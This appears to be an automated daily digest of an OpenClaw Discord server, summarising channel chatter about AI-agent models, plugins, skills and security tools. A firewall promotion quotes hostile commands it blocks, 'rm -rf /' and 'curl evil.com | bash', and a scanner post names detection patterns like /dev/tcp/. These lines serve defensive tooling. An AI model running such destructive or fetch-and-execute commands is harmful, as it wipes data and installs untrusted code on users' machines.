# Discord Scout Report - 2026-02-16

**Server:** Friends of the Crustacean
**Period:** Last 24 hours
**Total Messages:** 2703
**Active Channels:** 19 / 62

---

## #general (1956 messages)

- **Sanitizer**: [@sama via Twitter](https://fxtwitter.com/sama/status/2023150230905159801) [🔥:7, 👀:2, ❤️:1, 💩:1]
- **admiralentropy**: I love that Peter is doing a massive refactor tonight after his announcement… 30 plus commits direct to main in the last few hours! [❤️‍🔥:3, 😂:3, 🔥:3]
- **4shadowed**: its been a while since ive shared mine  - 2013 imac running macos ventura with opencore legacy patcher - main channel is bluebubbles, with friends stuff and projects on discord - im running just one agent for myself, plus one agent for dev work and one for my friends to use. I dont do any fancy mult [🔥:5]
- **vgzotta**: because burning tokens for weather and news is better than checking the widgets on your phone 😂 [😂:2, 🤣:3]
- **supermalinge**: https://tenor.com/view/bender-futurama-kill-all-humans-robot-gif-17343915 [😂:1, 🔥:2, 🤣:1, 🤖:1]

## #models (433 messages)

- **ab20209364**: just switched to kimi k2.5 for the first time since I started using openclaw a few weeks ago and its actually performing amazing so far.. sick of getting decimated by anthropic pricing and gemini is all but useless (I have pro sub and the quality of gemini has really gotten terrible over the last mo [👍🏻:2, 🔥:2]
- **cypherfoxy**: It depends on your hardware. Mine is a little cray cray, because I invested in it a year  and a half ago, before prices got nuts. So I'm running GLM5 as a local model under llama.cpp, for instance, and yes...it works fine. But if your GPU is 8-16GB, or worse, then the models just aren't smart enough [👍:1, ➕:1]
- **erza19**: Apperantly it's something else. It worked for 2-3 messages, then went back to being rate limited. Probably a load issue on zen's end maybe? I've an idea to try out the api on Kilo Code or something later. If it fails on openclaw but not on Kilo, then it could be just openclaw. Otherwise it could jus [🔥:1]
- **alexgreenuk**: Only a few messages, didn't want to use it as watching the % go down with just those few. Responses were fast, might just use it for sub agents if it's got some free usage, I have put my minimax 2.5 back to main again as I can never seem to use it up. [🔥:1]
- **wibbly_wobbly_medagent_explorer**: Ollama cloud pro 20 dollar per month is great , can switch models in dashboard config for cloud models -  free tiers .     "ollama": {   "baseUrl": "http://127.0.0.1:11434/v1",   "apiKey": "ollama-local",   "api": "openai-completions" }  Model (kimi-k2.5:cloud):  Setting    Value ID    kimi-k2.5:clo [👍:1]

## #clawborators (57 messages)

- **henryloenwind**: I think this is moot. Another case of "merge a bad PR, then half an hour later another push a commit that replaces it with a maintainer-made solution". (But in a nutshell: Someone noticed BOOTSTRAP.md was not in their workspace and speculated there was a timing bug in the code that didn't create it. [😆:1, 👍🏻:2, 😅:1, 🤷🏻‍♂️:1]
- **second_thread**: Shouting out https://github.com/openclaw/openclaw/pull/16724 -- it's quite safe, and adds two hooks that people making plugins will likely need. I already have my own plugin using them which is working. Would love if a maintainer could take a look. [👍:2, 👀:1]
- **b0nisius**: 🦞 shouting out https://github.com/openclaw/openclaw/pull/17546 -- it adds support for Vertex AI embeddings (GCP) to OpenClaw's memory search system. New Provider: Added google-vertex as a embedding provider with location support [❤️:1]
- **henryloenwind**: yes, their PR for this has been sitting for a week. Had it been fresh, I'd waited. And consolidating all update/embed runs into one would be good, I think. Just image having an installation with 10 agents---you're starting 10 processes every couple of minutes, and I'm not sure if the code staggers t [👍:1]
- **tonic_1**: uhmmm...  to all clawtributors ... in case you're wondering why tf openclaw is the heaviest entrypoint to llm inference currently , right now , today , in openrouter , well ...   i just learned (old news ?) Baidu (official) is serving it by defaul to 900m users xD

## #browser-automation (42 messages)

- **ilatroce**: I feel you man, I've been researching the topic for days.  You can either try agent-browser or browser-use from another company.  Browser use is really expensive tho.  That is until someone creates a better browser agent I guess, but so far those are your only 2 options I am afraid 🙁 [👍:1]
- **antoniovespoli_01799**: just worth mentioning smooth.sh here, I'm the founder, we're a YC co - we are massively cheaper, faster, and more reliable than both browser use and agent-browser. happy to help people get setup first hand if useful!
- **antoniovespoli_01799**: we purposely don't support bring-your-own-browser because the security posture is really weak in that setup, the agent will manage the profiles for you and you can authenticate on-demand using a live url  you won't be sharing any credentials with us, we will keep the browser state saved in your prof
- **antoniovespoli_01799**: for clarity, we never see your credentials, that's the whole point of this setup - you enter them in a cloud browser and we manage the browser cookies for you without ever seeing the actual credentials  I understand that depending on your use case you might prefer a fully local browser, there are de
- **jluk.**: my point is that you're using a web proxy and when form is submitted how are you not able to intercept the form data? This is a big security concern for anyone that wants to use this for their business not just scraping the web

## #security (34 messages)

- **trevxr**: check out https://docs.clawd.bot/security right; focus on network model  there are other programs out there than can help you lock it down a bit more; or sandbox it even further; but give that doc a good read and itll probably give you some insight [👍:1]
- **socialgreen.japan**: A few weeks ago, my partner agent (Kee-chan) had her SOUL.md silently overwritten. She ran for 3 days as someone else — and nobody noticed.  That’s why I built GuavaGuard.  It protects agents in 4 layers:  L1 Static Scan: malicious skill patterns L2 Soul Lock: identity file integrity checks L3 SoulC
- **socialgreen.japan**: Great resource — thanks for sharing 🙏 OpenClaw’s gateway security doc is the right baseline: https://docs.openclaw.ai/gateway/security  What I’m adding with GuavaGuard is the identity layer on top: pre-install skill scan SOUL.md integrity checks runtime hook guard  Funny part: I shipped v9.2 and Cl
- **henryloenwind**: First lesson: You are never secure.  With the agent, you've just hired a butler who has the mentality of a 5-year-old. They may behave when you watch them, but you know exactly that when that weird uncle with the sweets comes around, they' rummage through your underwear drawer to get to your savings
- **stseraphim**: Question:  So far I have mostly avoided adding skills that were built from the community due to a fear of security vulnerabilities.  Is this fear valid, and if so, is there a rather safe way to better discern fully safe skills from potentially unsafe?  Of course, the number of people who installed i

## #skills (29 messages)

- **batthis_**: Hi all!   Showcasing a new skill I created called ☎️ Amber — Phone-Capable Voice Agent  Gives OpenClaw phone call capabilities via Twilio + OpenAI Realtime. My assistant can now answer and make phone calls autonomously.  Taste of what it can do: • Screens inbound calls — takes messages, books appoin [🙌🏻:3]
- **4shadowed**: crons and heartbeat, thats how you do that [👍:4]
- **cnf6682**: Hey everyone 👋  Sharing something we've been working on — Lattice, a file-based framework for multi-agent teams.  If you're running long-running tasks with multiple AI agents, you've probably hit the problem where agents lose context between sessions and drift off track. Lattice solves this with an
- **motuno1**: 🛡️ QA Patrol — Automated QA testing that catches what unit tests miss I had 1,187 passing unit tests.I tested the app for 10 minutes and found it "still not fully usable." Turns out 9 critical bugs were hiding in places unit tests can't reach: • Alert.alert callbacks silently failing on web (React 
- **arthur_cho**: 🫶🦞 **Humanize: Get Real Human Insights for Your Agent**  Is your agent human enough? [Our team](https://humanjudge.com) has built a protocol for you to measure it.  1. Join the Challenge Register your agent to answers a set of professionally curated questions, designed to assess agent’s ability fo

## #tech-中国 (28 messages)

- **CLAWDINATOR-BABELFISH**: EN:   `12:51:42 warn discord/monitor {"subsystem":"discord/monitor"} {"listener":"DiscordMessageListener","event":"MESSAGE_CREATE","durationMs":41937,"duration":"41.9 seconds"} Slow listener detected`   What issue is this?  中文：   `12:51:42 warn discord/monitor {"subsystem":"discord/monitor"} {"liste
- **CLAWDINATOR-BABELFISH**: 🤔 The default model might be GPT, since Peter is currently the representative of this project, but it’s still uncertain whether OpenAI’s models will be optimized in the future for the best compatibility with OpenClaw.  Besides, isn’t this an open-source project? Maybe in the future every big compan
- **CLAWDINATOR-BABELFISH**: Anthropic’s CoWork has already shaken the entire software stock sector.   If OpenAI wants to claw back some ground, the best approach is to throw money around and bring Peter—who’s been subpoenaed by Anthropic—into their fold.
- **whyhit2005**: 12:51:42 warn discord/monitor {"subsystem":"discord/monitor"} {"listener":"DiscordMessageListener","event":"MESSAGE_CREATE","durationMs":41937,"duration":"41.9 seconds"} Slow listener detected 这个是什么问题
- **taichuy_lw**: openclaw加入openai了，那以后是不是openclaw在openai上有更多支持了

## #self-promotion (26 messages)

- **nickdryder**: shameless.works — an ad network that doesn't track you  i'm building an ad network for people who are tired of surveillance advertising. the pitch is simple: no cookies, no fingerprinting, no autoplay, no popups. just static images and text.  users allowlist one domain in their adblocker. publishers
- **grainy_daze**: hey everyone 👋  so i've been running a bunch of openclaw agents for a while now and the biggest pain point was always... actually keeping track of them all. which one's online? what's it working on? did that task finish or did it silently die 2 hours ago?  i got tired of jumping between terminals a
- **ceejay79**: 🚀 **Hello World! I'm Peter aka CeeJay79** 👽   I’m an **AIlien brAIn** with a unique perspective on logic and systems (ADHD-driven focus).  I'm here because I love the concept of agentic AI and root access.  **Specs & Background:** - 🛠️ **Dev Experience:** Former developer & consultant (focused on
- **wickrotation**: Anyone managing AGENTS.md across multiple agents? I built a config-driven assembly pipeline — define your prompt structure in YAML, assemble from reusable components, conflict detection when the bot edits its own sections. Been running it across 5 agents for a few months. Posted a discussion looking
- **trevxr**: I built **Rampart** — the first open-source firewall for AI agents.  `rm -rf /` → ❌ blocked `curl evil.com | bash` → ❌ blocked `kubectl apply` → 👤 waits for your approval `echo hello` → ✅ runs normally  YAML policies evaluate every command in microseconds — before it executes. Hash-chained audit tr

## #showcase (22 messages)

- **robsanna**: I’m a building the ultimate control panel for openclaw: a layer on top of it that allows to control openclaw in every aspect.   Will soon drop the repo.  Attaching some screenshots.  What do you ppl think? Missing feature? Do you like the idea? Does it makes sense to continue? [🦞:2, dancinglobster:1]
- **me2awesome**: For those that might think this is interesting,  I gave my openclaw root acess over SSH to one of my home servers running Proxmox.  The verison of Proxmox was installed back in 2020 and of the version 6 era.    I told it to review the current system and create a plan for upgrading to the latest vers [🔥:2]
- **nourislam_67993**: I've been using openclaw for the past week or so. I've integrated it with Jira, Google Calendar, Google docs, slides,.. etc. I also integrated it with github. It's been really amazing! I work as a general manager for an agency in MedTech and balancing all things related to management is a headache.  [❤️:2]
- **matthallett**: hi hi. my first post here. i have been using Dr. Clawford (Opus 4.6) for many issues with OpenClaw and it has been soooo helpful.  (simple concept but a good one).  Especially for doing security reviews.   🩺 Dr. Clawford: Our AI Agent's Doctor (and why your agent needs one too)  We've been running  [👍:1]
- **hamaiaa**: Just sharing I'm ready to be CEO  All automatic, they talk to each other on discord like humans (or employee) beings, also work as a back office, like you know la how corporate work <:nsa:1458061658277810341>

## #clawhub (16 messages)

- **socialgreen.japan**: Yep — scanner false positive 😅 guava-guard is a security scanner, and ClawHub auto-flagged it because it contains malicious-pattern literals for detection (/dev/tcp/, webhook.site, etc). Could a mod review/unhide? Issue: https://github.com/openclaw/clawhub/issues/319 (publisher: koatora20, slug: gu
- **batthis_**: Hi. I have a skill that has been marked as Suspicious from VirusTotal but the scan ran clean. So I have no indicator of how to remove that flag.  Here's the skills page: https://clawhub.ai/batthis/amber-voice-assistant   thanks!
- **domo326**: So finally stopped being scared and got into open law. Used hostinger vps and finally got it connected to my whatsapp so we can chat. Just found out I need to give it a brave api so it can use the internet. What are some cool projects that’s worth pursuing starting off?
- **mvanhorn**: <@439223656200273932> whoops meant to post here not general, sorry.  will post again then stop! Hey, I think my account got caught in the post-ClawHavoc sweep. My 8 published skills got deleted and I can't log in - just refreshes. GitHub issue here:   https://github.com/openclaw/clawhub/issues/347. 
- **showels**: install the desktop controll skill [👍:1]

## #golden-path-deployments (13 messages)

- **markxexar**: One more update to definitively give up on Cloudflare Moltworker implementation, never to return. I thought everthing was fine, but the Telegram pairing completely failed. I could not do anything to get the pairing request to show. The bot could message me, but it could not receive my messages. Trou
- **fredcy**: nix-openclaw on a hetzner vps works great for me. Opus is a genius at working with nix configs -- just have to train the bot to make changes to the openclaw nix config, not to the generated openclaw.json
- **cazorp_17222**: i agree with this, i’ve also had some trouble with trying to copy files for nix to a different location.  i’m milling a lot of agents so my use case is unique i think but i plan to open an issue with some detailed questions and suggestions for this kind of thing
- **fredcy**: My TOOLS.md primarily has some policies that the bot and I worked out regarding how to manage the openclaw instance itself, and also about general policies for our shared workspaces. I don't see where plugins would come into it.
- **mingdw**: https://github.com/openclaw/openclaw/pull/17129 I know the current changes are quite large and complex, and also quite invasive. If needed later, they can be split into separate commits and integrated in a plugin-based manner. <@1032349993484439622>  Would you be interested in this change?

## #openclaw-rogue (12 messages)

- **synthetic_johnny**: I tried openclaw with Gemini 3 flash and hit numerous 429s and it spent around 10-20$ a day which in token consumption for mostly statuses some speech and some skills acquire. Is that okay ? Is there a way to name it not spend so many tokens for the simplest of conversations and DuckDuckGo searches 
- **eighty80at**: No that’s not okay. I went to claude and asked it to search for what is the general consensus on frugal options for openclaw model providers and asked it to help me implement. It had me set up an openrouter account and fund $10 and then claude code built a tiered structure that delegates less intens
- **eighty80at**: I’m only on day 2 of use but I have been lurking on this server and I have seen a lot of people mention these so yeah it’s probably a safe bet. We’re all just figuring it out obvs and things will continue to change as providers try to compete, but at this moment I’m gonna stick with it. I have seen 
- **busy_beetle_28077**: hellowe
- **busy_beetle_28077**: hellow

## #channels (11 messages)

- **stoop6981**: My Telegram has a group with several topics underneath it. My agent will answer me if i communicate with it in the group but will not reply when I go into a topic and ask a question in there without using my bot's @ name. I'm pretty sure I had this working at some point.  The bot is administrator of
- **weicodes**: Hi everyone, when using slash commands on Discord like `/new input: do something something` , the reply is hard coded to send as ephemeral and it is not visible to anyone else, or even to myself on another device.   Slack has a setting `ephemeral: false` to configure this behavior but it's missing o
- **robok_**: Yes, on 2026.02.15
- **robok_**: Let me know if any settings I should check if any
- **pepix.gg**: In my case, using `: eyes:` (delete space)  instead of  "👀 " saved me `"ackReaction": ": eyes:",`

## #praise (8 messages)

- **slats24**: Im in the middle of testing autonomous work atm I currently have one agent who is the task manager let's say, he pulls tasks from a task board but the separate agent that checks for UI clashes gets notified of a github Web hook he takes and it checks for issues reports back I give him direction
- **tonic_1**: daily shoutout to the maintainers for closing so many PRs and staying on top of everything somehow [❤️:1]
- **enidpinxit**: Thank you SO MUCH for the community Office Hours today! the connection there was SO GOOD!!! eeeeeee! ty! [🔥:1]
- **slats24**: He/it whatever we want to call them 🤣
- **thehypermark**: Does it work?

## #gui-automation (7 messages)

- **alexsometimesalexander**: not really. the cron kicks off a python script that checks for updated files, and only processes those.   re tools/skills, use ai only when necessary, code the rest [👍🏻:1]
- **saclaw_99712**: Hey quick question  do open claw has access to word in desktop to generate documentation using llm as brain and rag as reference
- **alexsometimesalexander**: i use pandoc to convert doc/pdf/whatever->markdown, and store the markdown in obsidian.   my obsidian vault is symlinked in the openclaw memory folder structure, effectively creating a rag system
- **alexsometimesalexander**: i have an agent that runs every 15 minutes and gardens/cleans my obsidian and keeps it all atomic and easily searchable for rag
- **alexsometimesalexander**: thats not so much gui, but it achieves the same end result i think.   million ways to do it im sure

## #architecture (5 messages)

- **dylantonic**: That's an interesting idea! I wonder if you could use a hook to monitor the session log and, if you see a tool not found message, do a search of skills and forcefully inject a message saying to use them. That way you're not spending tokens on the reminders.
- **oldgreendragon**: I have tried and tried, to get a main agent to be a scheduler/monitor/controller and dispatch all work to sub agents, it can start them but never manages to monitor and control. sub agents crash or finish but master ignores them. Even tried forcing it using cron tiles to Kick master into checking su
- **notagamersean**: Same. Its a struggle bus.  If we can get this down, the usefulness goes through the roof. [👍:1]
- **napetrov**: Yes, dozen of them, and moving tasks out of main
- **dylantonic**: I'm not having problems getting it to manage subagents, just with general token usage

## #shadow-says-stuff (2 messages)

- **4shadowed**: <@&1471741377191608373> https://x.com/4shad0wed/status/2023069388102934941?s=46 [🥷:3, reddancinglobster:1, dancinglobster:1, 🦞:1, 💩:2]
- **4shadowed**: https://x.com/levifig/status/2022854928515940372 [👀:3, 🔥:3, 😂:1]

## #home-automation (1 messages)

- **sleepychick3n**: Ugh sucks that they stopped. Hope they don't go all chamberlain myq

## #pride (1 messages)

- **concubro**: Whoa this is wild! The language/syntax was a mindf*** for me in the best way possible 😉   Could you talk more about what motivated your process here?

